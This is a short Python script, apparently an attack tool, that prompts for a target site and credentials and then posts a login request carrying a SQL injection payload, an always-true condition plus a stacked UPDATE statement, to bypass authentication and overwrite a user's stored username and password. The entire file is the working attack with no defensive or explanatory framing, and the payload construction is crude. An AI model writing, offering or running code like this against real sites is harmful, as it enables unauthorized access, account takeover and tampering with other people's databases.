import requests

def exploit(site_address, username, password, new_username, new_password):
    # Craft a malicious SQL injection payload to bypass authentication and update login data
    payload = f"' OR '1'='1'; UPDATE users SET username='{new_username}', password='{new_password}' WHERE username='{username}' --"

    # Construct the login request with the malicious payload
    login_data = {
        'username': username,
        'password': password + payload
    }

    # Send the login request
    response = requests.post(site_address, data=login_data)

    # Check if the login was successful and the login data was updated
    if 'Login successful' in response.text:
        print("Authentication bypassed successfully!")
        print(f"Login data changed to: Username - {new_username}, Password - {new_password}")
    else:
        print("Failed to bypass authentication or update login data.")

if __name__ == "__main__":
    # Prompt the user for input
    site_address = input("Enter the site address: ")
    username = input("Enter the current username: ")
    password = input("Enter the current password: ")
    new_username = input("Enter the new username: ")
    new_password = input("Enter the new password: ")

    # Exploit the vulnerability
    exploit(site_address, username, password, new_username, new_password)
